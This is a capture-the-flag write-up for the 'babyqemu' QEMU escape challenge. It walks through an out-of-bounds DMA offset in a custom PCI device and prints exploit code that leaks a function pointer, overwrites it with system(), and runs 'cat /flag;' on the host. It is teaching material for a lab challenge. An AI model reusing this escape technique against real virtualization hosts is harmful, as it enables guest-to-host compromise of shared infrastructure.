## HITB GSEC - pwn - babyqemu

This is an introductory guest to host escape challenge on the qemu platform

before even thinking of finding vulnerabilities and start writing our exploit, its important to understand how virtualization in memory works on a basic level

actual pci devices expose register which the cpu reads from and writes into to send commands and get data back
in qemu, these registers exist in a C struct on the heap and are mapped into the guest's physical address space as memory mapped i/o (mmio) region, where reads and writes are intercepted and forwarded to the device's handler functions
in linux, each pci device's mmio regios is exposed as a file, for example:
`/sys/devices/pci0000:00/0000:00:04.0/resource0`
a guest userspace program can mmap this file and get a pointer directly into the device’s mmio range, no root privileges are required, this is how we and the exploit can interact with the device

### the challenge's pci device

our custom pci device is called 'hitb', by reversing the qemu binary using ida
we can find its' state struct

the device supports dma (direct memory access), we program it with a source address, a destination address, a byte count, and a command, and it copies data directly to or from guest's ram without the cpu doing it byte by byte, this is how real hardware handles bulk transfers efficiently

the dma registers are mapped at fixed offsets in the mmio region:
```
offset register purpose
0x80   src      source address/offset
0x88   dst      destination address/offset
0x90   cnt      byte count
0x98   cmd      command (1: write, 2: read, 4: encrypt)
```

the encrypt command is interesting, before copying data from the device to our guest's ram, it does the following:
`s->enc(s->dma_buf + src, cnt);`
enc is a pointer to 'hitb_enc()' which is a function related to our pci device is sitting in the struct right after the dma_buf[4096] buffer

### the vulnerability

```
void hitb_dma_timer(void *opaque) {
    HitbState *s = opaque;

    if (s->dma.cmd & 1) {
        // Write: guest RAM → dma_buf[dst]
        cpu_physical_memory_rw(s->dma.src,
                               s->dma_buf + s->dma.dst,
                               s->dma.cnt, 0);
    } else {
        // Read: dma_buf[src] → guest RAM
        if (s->dma.cmd & 4)
            s->enc(s->dma_buf + s->dma.src, s->dma.cnt);
        cpu_physical_memory_rw(s->dma.dst,
                               s->dma_buf + s->dma.src,
                               s->dma.cnt, 1);
    }
}
```

`s->dma_buf + s->dma.dst` and `s->dma_buf + s->dma.src`, the offset from the dma register
is added to the buffer pointer with no bounds check
dma_buf is 4096 bytes (offset 0x0 to 0xfff). The enc function pointer sits immediately after it at offset 0x1000, writing a dma transfer with dst = 0x1000 goes one byte past the end of the buffer and lands directly on enc. Reading with src = 0x1000 leaks enc’s current value with is the a address `hitb_enc()` by default

before doing anything with this, we need to set up our communication with the device:

- mmio access:
```
int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC); 
mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
```

- a dma buffer with a known physical address: dma hardware works with physical addresses, linux translates them internally, but we need to know the physical address ourselves to program the dma engine.

linux exposes this through `/proc/self/pagemap` which is a binary file where each 8 byte entry describes a virtual page, the lower 55 bits of each entry hold the physical page frame number when the page is resident in ram
```
uint64_t virt2phys_mem(void *ptr) {
    uint64_t virt = (uint64_t) ptr;

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        kill("[-] open /proc/self/pagemap failed");
    }

    uint64_t off = (virt / 0x1000) * 8;
    lseek(fd, off, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8) != 8) {
        kill("[-] phys read failed");
    }

    phys = (phys & ((1ULL << 63) - 1)) * 0x1000;
    return phys;
}
```

we allocate a page aligned buffer, mlock() it to pin it in ram (so the physical address stays stable and the page doesn’t get swapped out) and translate its address:

```
dmabuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
mlock(dmabuf, 0x1000);
dmabuf_phys_addr = virt2phys_mem(dmabuf);
```

### exploitation

a dma read copies from dma_buf[src] to guest ram at physical address dst, we set src = 0x1000 to read exactly what resides in the enc ptr (the hitb_enc() address)

```
#define DMA_BASE 0x40000

void* dma_read(uint64_t addr, size_t len) {
    dma_setsrc(addr);
    dma_setdest(dmabuf_phys_addr);
    dma_setcount(len);
    dma_start(2);
    sleep(1);
}
uint64_t dma_read_qword(uint64_t addr) {
    dma_read(addr, 8);
    return *((uint64_t*)dmabuf);
}

uint64_t hitb_enc = dma_read_qword(DMA_BASE + 0x1000);
```

now we calculate system() addr off of this:
```
uint64_t qemu_base = hitb_enc - 0x283dd0;
uint64_t system = qemu_base + 0x1fdb18;
```

and then we overwrite the enc ptr with system() and write our desired command as the argument:
```
dma_write_qword(DMA_BASE + 0x1000, system);
char* payload = "cat /flag;";
dma_write(DMA_BASE + 0x100, payload, strlen(payload));
```
and then we trigger it:
`dma_crypt_read(DMA_BASE + 0x100, 0x1);`
